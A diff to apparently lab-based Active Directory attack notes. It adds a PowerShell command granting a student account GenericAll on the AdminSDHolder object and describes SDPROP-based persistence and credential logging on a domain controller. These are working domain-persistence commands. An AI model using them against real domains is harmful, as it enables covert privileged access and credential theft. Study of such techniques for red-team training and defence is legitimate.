@@ -410,7 +410,7 @@ All local logons on the DC are now logged to `C:\Windows\system32\mimilsa.log`
 - In 60 minutes (when SDPROP runs), the user will be added with Full Control to the AC of groups like Domain Admins without actually being a member of it.
 
 
-**_Example -:**
+**_Example -:_**
 
 
 
@@ -432,5 +432,9 @@ Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc
 
 ```powershell
 
-
+Set-DCPermissions -Method AdminSDHolder -SAMAccountName student1 -
+Right GenericAll -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -Verbose
 ```
+
+
+
